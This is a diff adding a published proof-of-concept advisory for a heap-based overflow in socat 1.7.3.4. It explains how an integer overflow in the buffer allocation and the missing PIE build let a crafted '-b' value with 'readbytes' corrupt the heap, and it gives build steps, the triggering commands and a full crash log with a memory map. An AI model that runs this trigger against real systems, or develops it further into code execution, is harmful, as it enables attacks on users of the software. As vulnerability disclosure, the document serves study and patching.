@@ -1,0 +1,182 @@
+# Exploit Title: Socat 1.7.3.4 - Heap Based Overflow (PoC)
+# Date: 2020-02-03
+# Exploit Author: hieubl from HPT Cyber Security
+# Vendor Homepage: http://www.dest-unreach.org/
+# Software Link: http://www.dest-unreach.org/socat/
+# Version: 1.7.3.4
+# Tested on: Ubuntu 16.04.6 LTS
+# CVE :
+
+# Heap-Based Overflow due to Integer Overflow and Lack of PIE mitigation (PoC)
+
+------- [***Description***] -------
+The source code of socat.c contains _socat() function which has the
+Integer Overflow vulnerability:
+int _socat(void) {
+    ...
+    unsigned char *buff;
+    ...
+    buff = Malloc(2*socat_opts.bufsiz+1)
+    ...
+}
+
+After that, the the line of code "if ((bytes2 = xiotransfer(sock2,
+sock1, &buff, socat_opts.bufsiz, true)) < 0) {" calls the
+xiotransfer() function. The xiotransfer() function calls xioread()
+function. Finally xioread() function calls Read() function.
+
+ssize_t xioread(xiofile_t *file, void *buff, size_t bufsiz) {
+
+    ...
+    Read(pipe->fd, buff, bufsiz); //[***!!!This line of code leads to
+Heap-Based Overflow vulnerability***!!!]
+    ...
+}
+
+In addition, the "Makefile" file does not turn on the Position
+Independent Executables (PIE) mitigation (the CFLAGS does not contains
+"-pie" flag). By default, Ubuntu 16.04 does not turn on this
+mitigation. Consequently, it is easier to exploit the program, may
+even lead to Remode Code Execution (RCE).
+Reference: https://hackerone.com/reports/415272, $100 bounty for Linux
+Desktop application slack executable does not use pie / no ASLR
+
+------- [***Download and build***] -------
+Download link: http://www.dest-unreach.org/socat/download/socat-1.7.3.4.tar.gz
+$ tar xzvf socat-1.7.3.4.tar.gz
+$ cd socat-1.7.3.4/
+$ ./configure
+Modify "Makefile" file: "CFLAGS = -g -O -D_GNU_SOURCE -Wall
+-Wno-parentheses $(CCOPTS) $(DEFS) $(CPPFLAGS)" (add "-g" flag for
+debugging purpose)
+$ make
+$ sudo make install
+
+------- [***Proof of Concept***] -------
+$ checksec socat
+[*] '/home/natsu/temp/socat-1.7.3.4/socat'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    FORTIFY:  Enabled
+>>> There is no PIE mitigation!
+
+$ python -c 'print "A"*1000000' > a
+$ touch b
+$ socat -b9223372036854775888 OPEN:a,readbytes=1000000 OPEN:b,readbytes=1000000
+
+This proof of concept triggers the bugs by setting the buffer size to
+0x8000000000000050(9223372036854775888 in decimal). Therefore, the malloc
+size is passed to "Malloc(2*socat_opts.bufsiz+1)" is 0x100000000000000a0.
+This is equivalent to Malloc(0xa0). The readbytes("readbytes=1000000")
+controls the size of reading (we cannot read with the size too large as
+0x8000000000000050) with these lines of code: if (pipe->readbytes) { if
+(pipe->actbytes == 0) { return 0; } if (pipe->actbytes < bufsiz) { bufsiz =
+pipe->actbytes; } } ------- [***Crash logs***] ------- *** Error in
+`socat': free(): invalid next size (normal): 0x000000000106a110 ***
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fc0ee5817e5]
+/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fc0ee58a37a]
+/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fc0ee58e53c]
+socat[0x407e3f]
+socat[0x4084c6]
+socat[0x408f7a]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fc0ee52a830]
+socat[0x4057a9]
+======= Memory map: ========
+00400000-0044a000 r-xp 00000000 08:01 655643
+/usr/local/bin/socat
+00649000-0064a000 r--p 00049000 08:01 655643
+/usr/local/bin/socat
+0064a000-0064b000 rw-p 0004a000 08:01 655643
+/usr/local/bin/socat
+0064b000-0068c000 rw-p 00000000 00:00 0
+01069000-0108a000 rw-p 00000000 00:00 0
+ [heap]
+7fc0e8000000-7fc0e8021000 rw-p 00000000 00:00 0
+7fc0e8021000-7fc0ec000000 ---p 00000000 00:00 0
+7fc0eded3000-7fc0edee9000 r-xp 00000000 08:01 397801
+/lib/x86_64-linux-gnu/libgcc_s.so.1
+7fc0edee9000-7fc0ee0e8000 ---p 00016000 08:01 397801
+/lib/x86_64-linux-gnu/libgcc_s.so.1
+7fc0ee0e8000-7fc0ee0e9000 rw-p 00015000 08:01 397801
+/lib/x86_64-linux-gnu/libgcc_s.so.1
+7fc0ee0e9000-7fc0ee0ec000 r-xp 00000000 08:01 397787
+/lib/x86_64-linux-gnu/libdl-2.23.so
+7fc0ee0ec000-7fc0ee2eb000 ---p 00003000 08:01 397787
+/lib/x86_64-linux-gnu/libdl-2.23.so
+7fc0ee2eb000-7fc0ee2ec000 r--p 00002000 08:01 397787
+/lib/x86_64-linux-gnu/libdl-2.23.so
+7fc0ee2ec000-7fc0ee2ed000 rw-p 00003000 08:01 397787
+/lib/x86_64-linux-gnu/libdl-2.23.so
+7fc0ee2ed000-7fc0ee305000 r-xp 00000000 08:01 397909
+/lib/x86_64-linux-gnu/libpthread-2.23.so
+7fc0ee305000-7fc0ee504000 ---p 00018000 08:01 397909
+/lib/x86_64-linux-gnu/libpthread-2.23.so
+7fc0ee504000-7fc0ee505000 r--p 00017000 08:01 397909
+/lib/x86_64-linux-gnu/libpthread-2.23.so
+7fc0ee505000-7fc0ee506000 rw-p 00018000 08:01 397909
+/lib/x86_64-linux-gnu/libpthread-2.23.so
+7fc0ee506000-7fc0ee50a000 rw-p 00000000 00:00 0
+7fc0ee50a000-7fc0ee6ca000 r-xp 00000000 08:01 397763
+/lib/x86_64-linux-gnu/libc-2.23.so
+7fc0ee6ca000-7fc0ee8ca000 ---p 001c0000 08:01 397763
+/lib/x86_64-linux-gnu/libc-2.23.so
+7fc0ee8ca000-7fc0ee8ce000 r--p 001c0000 08:01 397763
+/lib/x86_64-linux-gnu/libc-2.23.so
+7fc0ee8ce000-7fc0ee8d0000 rw-p 001c4000 08:01 397763
+/lib/x86_64-linux-gnu/libc-2.23.so
+7fc0ee8d0000-7fc0ee8d4000 rw-p 00000000 00:00 0
+7fc0ee8d4000-7fc0eeaef000 r-xp 00000000 08:01 397619
+/lib/x86_64-linux-gnu/libcrypto.so.1.0.0
+7fc0eeaef000-7fc0eecee000 ---p 0021b000 08:01 397619
+/lib/x86_64-linux-gnu/libcrypto.so.1.0.0
+7fc0eecee000-7fc0eed0a000 r--p 0021a000 08:01 397619
+/lib/x86_64-linux-gnu/libcrypto.so.1.0.0
+7fc0eed0a000-7fc0eed16000 rw-p 00236000 08:01 397619
+/lib/x86_64-linux-gnu/libcrypto.so.1.0.0
+7fc0eed16000-7fc0eed19000 rw-p 00000000 00:00 0
+7fc0eed19000-7fc0eed77000 r-xp 00000000 08:01 397620
+/lib/x86_64-linux-gnu/libssl.so.1.0.0
+7fc0eed77000-7fc0eef77000 ---p 0005e000 08:01 397620
+/lib/x86_64-linux-gnu/libssl.so.1.0.0
+7fc0eef77000-7fc0eef7b000 r--p 0005e000 08:01 397620
+/lib/x86_64-linux-gnu/libssl.so.1.0.0
+7fc0eef7b000-7fc0eef82000 rw-p 00062000 08:01 397620
+/lib/x86_64-linux-gnu/libssl.so.1.0.0
+7fc0eef82000-7fc0eef84000 r-xp 00000000 08:01 397944
+/lib/x86_64-linux-gnu/libutil-2.23.so
+7fc0eef84000-7fc0ef183000 ---p 00002000 08:01 397944
+/lib/x86_64-linux-gnu/libutil-2.23.so
+7fc0ef183000-7fc0ef184000 r--p 00001000 08:01 397944
+/lib/x86_64-linux-gnu/libutil-2.23.so
+7fc0ef184000-7fc0ef185000 rw-p 00002000 08:01 397944
+/lib/x86_64-linux-gnu/libutil-2.23.so
+7fc0ef185000-7fc0ef18c000 r-xp 00000000 08:01 397917
+/lib/x86_64-linux-gnu/librt-2.23.so
+7fc0ef18c000-7fc0ef38b000 ---p 00007000 08:01 397917
+/lib/x86_64-linux-gnu/librt-2.23.so
+7fc0ef38b000-7fc0ef38c000 r--p 00006000 08:01 397917
+/lib/x86_64-linux-gnu/librt-2.23.so
+7fc0ef38c000-7fc0ef38d000 rw-p 00007000 08:01 397917
+/lib/x86_64-linux-gnu/librt-2.23.so
+7fc0ef38d000-7fc0ef3b3000 r-xp 00000000 08:01 397735
+/lib/x86_64-linux-gnu/ld-2.23.so
+7fc0ef594000-7fc0ef59a000 rw-p 00000000 00:00 0
+7fc0ef5b1000-7fc0ef5b2000 rw-p 00000000 00:00 0
+7fc0ef5b2000-7fc0ef5b3000 r--p 00025000 08:01 397735
+/lib/x86_64-linux-gnu/ld-2.23.so
+7fc0ef5b3000-7fc0ef5b4000 rw-p 00026000 08:01 397735
+/lib/x86_64-linux-gnu/ld-2.23.so
+7fc0ef5b4000-7fc0ef5b5000 rw-p 00000000 00:00 0
+7ffe11dd9000-7ffe11dfa000 rw-p 00000000 00:00 0
+ [stack]
+7ffe11dfb000-7ffe11dfe000 r--p 00000000 00:00 0
+ [vvar]
+7ffe11dfe000-7ffe11e00000 r-xp 00000000 00:00 0
+ [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0
+ [vsyscall]
+2020/02/04 05:33:00 socat[47233] E exiting on signal 6
